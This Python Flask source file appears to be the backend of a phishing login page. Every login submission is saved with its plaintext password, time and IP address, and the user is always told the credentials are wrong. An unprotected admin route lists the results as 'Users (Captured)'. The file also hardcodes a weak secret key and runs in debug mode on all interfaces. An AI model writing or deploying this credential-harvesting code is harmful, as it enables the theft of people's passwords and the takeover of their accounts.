from flask import Flask, render_template, request, redirect, url_for, session, g
import sqlite3
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'secret123'
DATABASE = 'users.db'

# ----------- DATABASE FUNCTIONS -----------

def get_db():
    if '_database' not in g:
        g._database = sqlite3.connect(DATABASE)
    return g._database

@app.teardown_appcontext
def close_connection(exception):
    db = g.pop('_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT
            )
        ''')
        db.execute('''
            CREATE TABLE IF NOT EXISTS login_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                login_time TEXT,
                ip_address TEXT
            )
        ''')
        db.commit()

# ----------- ROUTES -----------

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        db = get_db()

        # Save new user
        db.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))

        # Log login attempt
        login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = request.remote_addr
        db.execute("INSERT INTO login_logs (username, login_time, ip_address) VALUES (?, ?, ?)",
                   (username, login_time, ip))
        db.commit()

        # Show error always
        error = "Incorrect username or password."
        return render_template('login.html', error=error)

    return render_template('login.html')

@app.route('/admin/view-logins')
def view_logins():
    db = get_db()
    users = db.execute("SELECT username, password FROM users").fetchall()
    logs = db.execute("SELECT username, login_time, ip_address FROM login_logs ORDER BY login_time DESC").fetchall()

    html = "<h2>Users (Captured)</h2>"
    html += "<ul>" + "".join([f"<li>{u[0]} : {u[1]}</li>" for u in users]) + "</ul>"

    html += "<h2>Login Logs</h2>"
    html += "<ul>" + "".join([f"<li>{l[0]} | {l[1]} | {l[2]}</li>" for l in logs]) + "</ul>"

    return html

# ----------- MAIN -----------

if __name__ == '__main__':
    init_db()
    app.run( host='0.0.0.0', debug=True)
